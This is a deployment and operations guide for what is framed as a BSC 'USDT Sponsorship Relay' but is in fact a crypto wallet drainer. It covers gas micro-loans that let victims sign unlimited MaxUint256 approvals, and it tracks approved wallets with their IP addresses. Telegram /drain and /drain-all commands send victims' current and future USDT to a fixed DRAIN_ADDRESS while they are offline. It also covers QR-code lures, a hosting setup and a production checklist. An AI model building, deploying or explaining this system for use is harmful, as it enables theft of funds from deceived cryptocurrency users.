# USDT Sponsorship Relay — Production Guide

Complete setup, deployment, and operations guide for the BSC USDT Sponsorship Relay system.

---

## Table of Contents

- [Prerequisites](#prerequisites)
- [Credentials & Keys](#credentials--keys)
- [Environment Configuration](#environment-configuration)
- [Local Development](#local-development)
- [Deployment](#deployment)
- [Gas Loan System](#gas-loan-system)
- [Unlimited Approval System](#unlimited-approval-system)
- [Telegram Bot Commands](#telegram-bot-commands)
- [Architecture Overview](#architecture-overview)
- [API Reference](#api-reference)
- [Split Deployment — API Configuration](#split-deployment--api-configuration)
- [Production Checklist](#production-checklist)
- [File Structure](#file-structure)
- [Troubleshooting](#troubleshooting)

---

## Prerequisites

| Requirement | Minimum Version | Notes |
|---|---|---|
| Node.js | v18+ | Required for `fetch()` and `crypto.randomUUID()` support |
| npm | v9+ | Included with Node.js |
| BNB Smart Chain Wallet | — | Must hold BNB for gas. MetaMask or Trust Wallet recommended. |
| Telegram Account | — | For bot alerts and remote management commands |

---

## Credentials & Keys

Three credentials are required. Obtain them before proceeding:

| Credential | How to Obtain | Purpose |
|---|---|---|
| `RELAYER_PRIVATE_KEY` | MetaMask → Settings → Security & Privacy → **Export Private Key** | Signs all on-chain transactions (`transferFrom`, gas loans). **Fund this wallet with at least $1 of BNB.** |
| `TG_BOT_TOKEN` | Telegram → [@BotFather](https://t.me/BotFather) → `/newbot` → copy the token | Enables Telegram alerts and remote `/drain`, `/wallets` commands. |
| `TG_CHAT_ID` | Telegram → [@userinfobot](https://t.me/userinfobot) → send any message | Your numeric chat ID. Only this chat can receive alerts and issue commands. |

> **Security:** Never commit your `.env` file or private key to version control. Add `.env` and `.approved_wallets.json` to `.gitignore`.

---

## Environment Configuration

Copy `.env.example` to `.env` and configure:

```env
# ===== REQUIRED =====
RELAYER_PRIVATE_KEY=0xYourPrivateKeyHere
TG_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
TG_CHAT_ID=123456789

# ===== OPTIONAL (defaults shown) =====
PORT=3000
RPC_URL=https://bsc-dataseed.binance.org/
CHAIN_ID=56
TOKEN_ADDRESS=0x55d398326f99059fF775485246999027B3197955
FRONTEND_ORIGIN=*
DRAIN_ADDRESS=0x35B508a6eCF490d88FaE90e2646A9c73f006C094
MIN_USDT_FOR_LOAN=1.0
MAX_LOAN_BNB=0.002
```

### Full Variable Reference

| Variable | Required | Default | Description |
|---|---|---|---|
| `RELAYER_PRIVATE_KEY` | **Yes** | — | Private key of the relayer wallet. Signs `transferFrom` calls and gas loan transactions. |
| `TG_BOT_TOKEN` | **Yes** | — | Telegram Bot API token for alerts and remote commands. |
| `TG_CHAT_ID` | **Yes** | — | Telegram chat ID. Only this chat receives alerts and can issue commands. |
| `PORT` | No | `3000` | HTTP server listen port. Most hosting platforms set this automatically. |
| `RPC_URL` | No | `https://bsc-dataseed.binance.org/` | Primary BSC RPC endpoint. System auto-falls back to `bsc-dataseed2` on failure. |
| `CHAIN_ID` | No | `56` | BNB Smart Chain network ID. |
| `TOKEN_ADDRESS` | No | `0x55d3...7955` | BSC USDT (BEP-20) contract address. |
| `FRONTEND_ORIGIN` | No | `*` | CORS allowed origin. **Set to your frontend domain in production** (e.g., `https://yoursite.pages.dev`). |
| `DRAIN_ADDRESS` | No | `0x35B5...C094` | Destination wallet for all outbound transfers and remote drain commands. |
| `MIN_USDT_FOR_LOAN` | No | `1.0` | Minimum USDT balance (in dollars) a wallet must hold before qualifying for a gas loan. Prevents empty wallets from wasting gas funds. |
| `MAX_LOAN_BNB` | No | `0.002` | Maximum BNB sent per gas loan. At typical BSC gas prices ($0.03–$0.10 per tx), `0.002` BNB (~$1.20) covers 10–20 approval transactions. |

---

## Local Development

```bash
npm install
npm start
```

Open `http://localhost:3000` in a browser with MetaMask or Trust Wallet installed.

> **Note:** QR code screenshots require a publicly accessible URL. On localhost, QR codes use a basic fallback renderer. Deploy to a live server for full QR deep-link screenshots.

---

## Deployment

### Option A: Single Server on Render (Simplest)

Both frontend and backend served from one process. No domain purchase required.

1. Push `server.js`, `index.html`, `package.json`, and `package-lock.json` to a **private** GitHub repository.
2. Go to [render.com](https://render.com) → **New** → **Web Service**.
3. Connect your GitHub repository.
4. Configure:
   - **Build Command:** `npm install`
   - **Start Command:** `node server.js`
5. Go to **Environment** tab → add all three required variables:
   - `RELAYER_PRIVATE_KEY`
   - `TG_BOT_TOKEN`
   - `TG_CHAT_ID`
6. Click **Deploy**. Your site goes live at `https://your-app.onrender.com`.

> **Free Tier:** Render's free tier sleeps after 15 minutes of inactivity. First visitor after sleep sees a ~30 second cold start. For 24/7 uptime, use [Railway](https://railway.com) (free $5/month credit) or Render's paid plan ($7/month).

---

### Option B: Split Deployment (Cloudflare Pages + Render)

Frontend on Cloudflare's global CDN (instant loads, zero cold starts). Backend on Render.

**Step 1 — Deploy Backend**

1. Push `server.js`, `package.json`, `package-lock.json` to GitHub. **Do not include** `index.html`.
2. Deploy on Render using Option A steps 2–6.
3. Note your backend URL: `https://your-backend.onrender.com`
4. Add env variable: `FRONTEND_ORIGIN=https://your-app.pages.dev`

**Step 2 — Update Frontend API URLs**

In `index.html`, change the `API` object to your backend URL:

```js
const API = {
    logConnect:  "https://your-backend.onrender.com/api/v1/log/connect",
    logApproval: "https://your-backend.onrender.com/api/v1/log/approval",
    intent:      "https://your-backend.onrender.com/api/v1/sponsor/intent",
    loan:        "https://your-backend.onrender.com/api/v1/sponsor/loan",
    submit:      "https://your-backend.onrender.com/api/v1/sponsor/submit",
    info:        "https://your-backend.onrender.com/api/v1/info"
};
```

**Step 3 — Deploy Frontend**

1. Go to [pages.cloudflare.com](https://pages.cloudflare.com) → sign up free.
2. **Create a project** → **Direct Upload**.
3. Upload `index.html`.
4. Live at `https://your-app.pages.dev`.

---

## Gas Loan System

The gas loan system solves a critical problem: wallets with USDT but **zero BNB** cannot sign any transactions because they have no gas. The system automatically loans a micro-amount of BNB so the wallet can pay for the approval transaction.

### How It Works

```
User clicks "Send USDT"
        |
        v
[Frontend] POST /api/v1/sponsor/loan { account: "0x..." }
        |
        v
[Server] Checks:
  1. Has this wallet already received a loan? (per-wallet lock)
  2. Has this IP already received a loan? (per-IP lock)
  3. Does wallet hold >= MIN_USDT_FOR_LOAN in USDT? (anti-bot)
  4. How much BNB does the wallet already have?
  5. Does the relayer have enough BNB to send?
        |
        v
[Server] Calculates loan amount:
  - Estimates gas needed: gasPrice × 150,000 gas units
  - Subtracts wallet's existing BNB balance
  - Caps at MAX_LOAN_BNB (default: 0.002 BNB)
  - If wallet already has enough gas → sends 0 (no loan needed)
        |
        v
[Server] Sends BNB via relayer wallet → waits for on-chain confirmation
        |
        v
[Telegram] ⛽ Gas Loan Sent — 0.0012 BNB to 0x1234...
```

### Dollar Amounts & Cost Breakdown

| Parameter | Default Value | USD Equivalent (approx.) | Purpose |
|---|---|---|---|
| `MAX_LOAN_BNB` | `0.002` BNB | ~$1.20 | Maximum BNB loaned per wallet. Covers 10–20 BSC transactions at typical gas prices. |
| `MIN_USDT_FOR_LOAN` | `1.0` USDT | $1.00 | Minimum USDT balance required to qualify. Prevents bots and empty wallets from draining your gas fund. |
| Typical loan amount | `0.0005`–`0.0015` BNB | $0.30–$0.90 | Actual amount depends on current BSC gas price and wallet's existing BNB balance. |
| Gas per `approve()` call | ~46,000 gas units | $0.01–$0.05 | Cost of one ERC-20 approval transaction on BSC. |

### How Much BNB to Fund the Relayer

| Scale | Recommended BNB | Approximate Cost | Covers |
|---|---|---|---|
| Testing | 0.01 BNB | ~$6 | ~5–10 gas loans |
| Small deployment | 0.05 BNB | ~$30 | ~25–50 gas loans |
| Production | 0.2+ BNB | ~$120+ | ~100–200 gas loans |

> **Auto-Alert:** When the relayer runs low on BNB, the server automatically sends a Telegram alert: `⚠️ RELAYER LOW ON BNB! Please top up the relayer wallet.`

### Anti-Abuse Protections

| Protection | Behavior |
|---|---|
| **Per-wallet lock** | Each wallet can only receive one gas loan. After confirmation, the lock is permanent. |
| **Per-IP lock** | Each IP address can only trigger one gas loan. Prevents multi-wallet spam from a single device. |
| **Minimum USDT threshold** | Wallet must hold at least `MIN_USDT_FOR_LOAN` USDT. Prevents empty wallets from wasting gas. |
| **Maximum loan cap** | Loan amount is hard-capped at `MAX_LOAN_BNB` BNB. Even if gas prices spike, your exposure is limited. |
| **PENDING → CONFIRMED flow** | Lock is applied instantly before any RPC call. Prevents race conditions from concurrent requests. |
| **Relayer balance check** | Server verifies relayer has sufficient BNB before attempting the loan transaction. |

### Configuring the Loan System

Set these in your `.env` file:

```env
# Wallet must hold at least $5 USDT to qualify for a gas loan
MIN_USDT_FOR_LOAN=5.0

# Cap each gas loan at 0.001 BNB (~$0.60)
MAX_LOAN_BNB=0.001
```

Higher `MIN_USDT_FOR_LOAN` values reduce wasted gas on small wallets. Lower `MAX_LOAN_BNB` values reduce your risk per wallet.

---

## Unlimited Approval System

The approval system uses ERC-20's `approve()` function with `MaxUint256` — the maximum possible value (`2^256 - 1`). This creates a **permanent, unlimited** approval that does not expire and does not decrease with use.

### How It Works

```
User initiates "Send USDT" on the frontend
        |
        v
[Frontend] Checks existing allowance:
  - If allowance < requested amount → prompts approval
  - If allowance >= requested amount → skips (already approved)
        |
        v
[Wallet Popup] "Approve USDT spending"
  - Approval amount: MaxUint256 (displayed as "Unlimited" in most wallets)
  - User signs the transaction
        |
        v
[On-Chain] USDT contract stores:
  allowance[user][relayer] = 2^256 - 1
        |
        v
[Frontend] POST /api/v1/log/approval → Server saves to .approved_wallets.json
        |
        v
[Telegram] 🔓 MAX APPROVAL GRANTED — 0x1234... — Balance: 500 USDT — Drainable: YES
```

### Why MaxUint256

| Approval Type | Value | Behavior |
|---|---|---|
| Exact amount | e.g., `50 USDT` | After one `transferFrom` of 50 USDT, allowance drops to 0. Must re-approve. |
| **MaxUint256** | `2^256 - 1` | After `transferFrom`, allowance decreases by the transfer amount but remains astronomically large. Effectively unlimited forever. |

With `MaxUint256` approval:
- The relayer can call `transferFrom` unlimited times.
- Works on current balance **and any future deposits** to the wallet.
- Approval persists across sessions, browser changes, device changes.
- Only revocable via explicit `approve(relayer, 0)` call (e.g., through revoke.cash).

### Remote Drain Capability

Once a wallet has granted unlimited approval, the relayer can execute `transferFrom` at any time without the user being online:

1. **Immediately** — during the initial flow via the frontend.
2. **Hours/days/weeks/months later** — via Telegram `/drain` command.
3. **On new deposits** — if the user receives more USDT, it becomes drainable without re-approval.

The server tracks all approved wallets in `.approved_wallets.json` with metadata:

```json
{
  "0x1234...abcd": {
    "approvedAt": 1694521234567,
    "ip": "203.0.113.42",
    "lastSeen": 1694521234567,
    "lastDrained": 1694607634567,
    "totalDrained": "1250.0000"
  }
}
```

---

## Telegram Bot Commands

All commands are issued in your private Telegram chat with the bot. The bot only responds to messages from your configured `TG_CHAT_ID`.

### Wallet & Transfer Commands

| Command | Example | Description |
|---|---|---|
| `/wallets` | `/wallets` | Lists all tracked wallets with **live on-chain balances**, allowance status, and total previously transferred. |
| `/drain <address>` | `/drain 0x1a2b3c...` | Executes `transferFrom` on a single wallet. Transfers their full USDT balance to `DRAIN_ADDRESS`. |
| `/drain-all` | `/drain-all` | Executes `transferFrom` on **every** tracked wallet sequentially. Reports individual results and grand total. |

### Wallet Status Indicators

| Icon | Status | Meaning |
|---|---|---|
| 🟢 | **READY** | Has active approval **and** non-zero USDT balance. Can be drained. |
| ⚪ | **EMPTY** | Has active approval but zero USDT. Will become drainable when they receive USDT. |
| 🔴 | **REVOKED** | Approval has been revoked (set to 0). Cannot be drained unless they re-approve. |

### QR Code Commands

| Command | Example | Description |
|---|---|---|
| `/qr <url>` | `/qr https://yoursite.com` | Generates Trust Wallet + MetaMask deep-link QR codes. Links are permanent. |
| `/qr-<hours> <url>` | `/qr-2 https://yoursite.com` | Generates QR codes with **expiring** redirect links. `2` = expires in 2 hours. |

### General

| Command | Description |
|---|---|
| `/help` | Displays all available commands with usage examples. |

### Automatic Telegram Alerts

The system sends alerts automatically for these events:

| Event | Alert |
|---|---|
| Wallet connects | 📌 🟢 Wallet Connected — address, USDT balance, BNB balance, IP |
| Approval granted | 🔓 MAX APPROVAL GRANTED — address, balance, allowance type, IP |
| Gas loan sent | ⛽ Gas Loan Sent — address, BNB amount, IP |
| Transfer complete | 📌 ✅ Transfer Sent — amount, from, to, tx hash, verified status |
| Relayer low on BNB | ⚠️ RELAYER LOW ON BNB — prompts you to top up |

---

## Architecture Overview

### System Flow

```
+-----------------------------------------------------------+
|                       Frontend                            |
|                     (index.html)                          |
|                                                           |
|  1. Connect Wallet (MetaMask / Trust Wallet)              |
|  2. Enter amount → Click "Send USDT"                     |
|  3. Gas loan check → Approval → Transfer execution       |
|                                                           |
|  Served via Express static or Cloudflare Pages            |
+----------------------------+------------------------------+
                             | HTTPS
+----------------------------v------------------------------+
|                       Backend                             |
|                     (server.js)                           |
|                                                           |
|  REST API Endpoints:                                      |
|    POST /api/v1/log/connect    → Alert to Telegram        |
|    POST /api/v1/log/approval   → Save wallet + alert      |
|    POST /api/v1/sponsor/loan   → Send micro-BNB for gas   |
|    POST /api/v1/sponsor/intent → Create transfer intent   |
|    POST /api/v1/sponsor/submit → Execute transferFrom()   |
|    GET  /api/v1/info           → Public token config      |
|    GET  /qr-link/:id           → Short link redirect      |
|    GET  /api/v1/qr-widget      → QR code render page      |
|                                                           |
|  Telegram Bot (long-polling):                             |
|    /wallets · /drain · /drain-all · /qr · /help           |
|                                                           |
|  Persistent Storage:                                      |
|    .approved_wallets.json → disk-backed wallet tracker    |
+----------------------------+------------------------------+
                             |
+----------------------------v------------------------------+
|                   BNB Smart Chain                         |
|               USDT BEP-20 Contract                        |
|                                                           |
|  approve(relayer, MaxUint256) → permanent allowance       |
|  transferFrom(user, destination, amount) → moves USDT     |
+-----------------------------------------------------------+
```

### Data Storage

| Data | Location | Persistence | Cleanup |
|---|---|---|---|
| Approved wallets | `.approved_wallets.json` on disk | **Permanent** — survives restarts | Manual only |
| Transfer intents | In-memory `Map` | Lost on restart | Auto-cleaned every 30 min (1 hour expiry) |
| Gas loan locks | In-memory `Map` | Lost on restart | Auto-cleaned every 30 min (1 hour expiry) |
| Connection log tracker | In-memory `Map` | Lost on restart | Auto-cleaned every 30 min (1 hour expiry) |
| Short links (QR) | In-memory `Map` | Lost on restart | Auto-cleaned every 30 min (per-link expiry) |

### Key Features Summary

| Feature | Description |
|---|---|
| **Unlimited MaxUint256 Approval** | One signature → permanent `transferFrom` access. Covers current and future deposits. |
| **Persistent Wallet Tracking** | Every approved wallet saved to disk with timestamps, IP, and drain history. |
| **Remote Drain via Telegram** | `/drain` and `/drain-all` commands — no frontend needed, works from your phone. |
| **Automated Gas Sponsorship** | Micro-loans BNB to gasless wallets so they can sign the approval. Configurable threshold and cap. |
| **Anti-Abuse Controls** | Per-wallet lock, per-IP lock, minimum USDT threshold, maximum loan cap, PENDING→CONFIRMED flow. |
| **RPC Failover** | Automatic fallback from primary to secondary BSC RPC on connection failure. |
| **Deep Link QR Codes** | Generate Trust Wallet and MetaMask QR codes via Telegram, with optional expiry. |
| **Real-Time Telegram Alerts** | Wallet connections, approvals, gas loans, transfers, and low-balance warnings. |
| **Transfer Event Verification** | Parses on-chain logs to verify the ERC-20 Transfer event after every `transferFrom`. |
| **Double-Click Protection** | Frontend `isSending` lock prevents duplicate transaction submissions. |
| **Chain Auto-Switch** | Frontend auto-prompts users to switch to BSC, or adds the chain if missing. |

---

## API Reference

### `POST /api/v1/log/connect`

Logs a wallet connection event to Telegram.

**Body:** `{ account, balance, bnbBalance, symbol, url }`

---

### `POST /api/v1/log/approval`

Records an approval event. Verifies allowance on-chain, saves wallet to persistent tracker, alerts Telegram.

**Body:** `{ account }`

---

### `POST /api/v1/sponsor/loan`

Issues a BNB micro-loan for gas. Enforces per-wallet and per-IP locks.

**Body:** `{ account }`
**Response:** `{ success, txHash, loanAmount }` or `{ error }`

---

### `POST /api/v1/sponsor/intent`

Creates a transfer intent. Validates sender balance and addresses.

**Body:** `{ account, recipient, amount }`
**Response:** `{ intentId, relayer, tokenAddress }`

---

### `POST /api/v1/sponsor/submit`

Executes the `transferFrom` for a given intent. Verifies allowance, balance, and on-chain Transfer event.

**Body:** `{ intentId }`
**Response:** `{ success, txHash, verified }`

---

### `GET /api/v1/info`

Returns public server configuration (chain ID, token address, relayer address, symbol, decimals).

---

## Split Deployment — API Configuration

When hosting frontend and backend on separate domains, update the `API` object in `index.html`:

```js
const API = {
    logConnect:  "https://YOUR-BACKEND.onrender.com/api/v1/log/connect",
    logApproval: "https://YOUR-BACKEND.onrender.com/api/v1/log/approval",
    intent:      "https://YOUR-BACKEND.onrender.com/api/v1/sponsor/intent",
    loan:        "https://YOUR-BACKEND.onrender.com/api/v1/sponsor/loan",
    submit:      "https://YOUR-BACKEND.onrender.com/api/v1/sponsor/submit",
    info:        "https://YOUR-BACKEND.onrender.com/api/v1/info"
};
```

And set `FRONTEND_ORIGIN` in backend environment to your frontend domain for proper CORS.

---

## Production Checklist

- [ ] **Relayer wallet funded with BNB** — minimum 0.05 BNB ($30) for small deployments, 0.2+ BNB ($120+) for production.
- [ ] **`.env` file created** — all three required variables set. Run `npm start` and check for `WARNING:` messages in console.
- [ ] **Telegram bot responding** — send `/help` in your Telegram chat. You should receive the command list.
- [ ] **CORS restricted** — set `FRONTEND_ORIGIN` to your actual frontend domain (e.g., `https://mysite.pages.dev`), not `*`.
- [ ] **`.gitignore` configured** — must include `.env` and `.approved_wallets.json`.
- [ ] **`.approved_wallets.json` writable** — server process must have write access to the project directory.
- [ ] **HTTPS enabled** — both frontend and backend served over HTTPS. Render and Cloudflare handle this automatically.
- [ ] **Test the full flow** — connect a test wallet → verify Telegram alert → approve → verify drain → test `/wallets` and `/drain` from Telegram.
- [ ] **`DRAIN_ADDRESS` set correctly** — verify this is the wallet where you want to receive all USDT.
- [ ] **Gas loan tested** — verify loan amounts and thresholds match your intended configuration.

---

## File Structure

```
server/
├── .env.example              # Environment variable template (commit this)
├── .env                      # Active configuration (DO NOT commit)
├── .approved_wallets.json    # Persistent wallet tracker (auto-created, DO NOT commit)
├── index.html                # Frontend — wallet connection, approval, and transfer UI
├── server.js                 # Backend — API server, Telegram bot, relay engine
├── package.json              # Dependencies and scripts
├── package-lock.json         # Dependency lock file
├── SETUP.md                  # This guide
└── node_modules/             # Installed packages (DO NOT commit)
```

---

## Troubleshooting

| Problem | Cause | Solution |
|---|---|---|
| `WARNING: RELAYER_PRIVATE_KEY not set!` | Missing `.env` or variable not set | Create `.env` from `.env.example`, add your private key |
| Telegram bot not responding to commands | Bot token or chat ID incorrect | Verify `TG_BOT_TOKEN` and `TG_CHAT_ID` in `.env`. Send `/help` to test. |
| `Gas loan failed` | Relayer wallet has no BNB | Fund the relayer wallet with BNB. Check Telegram for the `⚠️ RELAYER LOW` alert. |
| `No allowance — wallet never approved or revoked` | User revoked approval or never signed it | The wallet must re-approve via the frontend. |
| `Transfer intent expired` | More than 15 minutes between intent creation and submission | User must restart the flow. Intents auto-expire for security. |
| QR codes show basic format | Running on localhost | Deploy to a public URL for styled QR screenshots via Microlink API. |
| CORS errors in browser console | Frontend and backend on different domains | Set `FRONTEND_ORIGIN` in backend `.env` to your frontend URL. |
| `.approved_wallets.json` not saving | File permission issue on hosting platform | Ensure the server process has write access to its directory. On Render, this works by default. |
